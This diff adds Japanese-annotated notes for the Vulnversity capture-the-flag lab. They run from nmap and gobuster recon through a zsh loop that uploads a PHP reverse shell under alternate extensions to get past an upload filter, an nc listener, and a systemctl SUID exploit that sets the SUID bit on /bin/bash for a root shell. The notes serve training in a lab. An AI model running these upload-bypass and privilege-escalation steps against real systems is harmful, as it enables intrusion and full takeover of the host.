@@ -1,0 +1,71 @@
+nmap -sV -oN nmap.log 10.48.146.167
+
+gobuster dir -u http://10.48.146.167:3333 -w /usr/share/wordlists/dirb/common.txt
+
+cp /usr/share/webshells/php/php-reverse-shell.php .
+
+phpには複数の拡張子があるため、拡張子を変更することで実行できる。
+
+--
+
+#!/bin/zsh
+
+extensions=("php" "php3" "php4" "php5" "phtml")
+
+for ext in "${extensions[@]}"
+do
+    echo "Testing extension: .$ext"
+    cp php-reverse-shell.php "shell.$ext"
+    result=$(curl -s -X POST http://10.48.146.167:3333/internal/index.php \
+        -F "file=@shell.$ext" | grep -i "extension not allowed")
+    
+    if [ -z "$result" ]; then
+        echo "[+] SUCCESS: .$ext was uploaded!"
+    else
+        echo "[-] FAILED: .$ext is blocked"
+    fi
+    rm -f "shell.$ext"
+done
+
+--
+
+リバースシェルの接続を待つ。
+nc -lvnp 1234
+
+
+find / -perm /6000 2>/dev/null
+
+49 x 7
+シェル取得成功して権限昇格フェーズに入りましたね。
+
+このコマンドはSUID/SGIDビットが設定されたファイルを探します。通常と異なるSUIDバイナリが権限昇格に使えます。
+
+出力の中で、Vulnversityでは /bin/systemctl がSUID付きで見つかるはずです。これが異常で、exploitに使えます。
+
+systemctl を使った権限昇格：
+
+rootシェルが欲しい場合は ExecStart を変更：
+
+/bin/bash -p でroot権限のシェルが取れます。
+
+SUIDのせつめいをひとことで
+
+SUID = そのファイルを実行すると、実行者に関係なくファイル所有者の権限で動く特殊パーミッション。
+/bin/systemctl
+
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+/bin/bash -p
+
+ls -l /bin/bash
+/bin/bash -p
+
+
+
